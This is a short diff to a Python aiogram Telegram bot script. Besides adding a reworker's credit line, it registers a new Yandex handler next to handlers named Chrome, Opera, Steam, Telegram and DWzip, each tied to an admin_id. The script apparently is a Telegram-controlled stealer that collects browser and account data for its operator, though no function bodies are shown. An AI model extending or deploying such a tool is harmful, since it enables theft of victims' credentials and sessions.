@@ -1,6 +1,7 @@
 # # # # # # # # # # # # # # # # # # # # # # #
 #                                           #
 #         by BeanD [t.me/PearDe]            #
+#         Дорабатал [t.me/@Starostai]       #
 #                                           #
 # # # # # # # # # # # # # # # # # # # # # # #
 
@@ -11,8 +12,7 @@ import asyncio
 if getattr(sys, 'frozen', False):
     sys.path.append(sys._MEIPASS)
     
-
-# ---- Imports для aiogram 2.x ---- #
+# ---- Imports ---- #
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import Message, ContentType
 from aiogram.dispatcher import Dispatcher
@@ -141,6 +141,7 @@ Get_size(dp, bot, admin_id)
 Telegram(dp, bot, admin_id)
 Chrome(dp, bot, admin_id)
 Opera(dp, bot, admin_id)
+Yandex(dp, bot, admin_id)
 Steam(dp, bot, admin_id)
 DWzip(dp, bot, admin_id)
 SeeEx(dp, bot, admin_id)
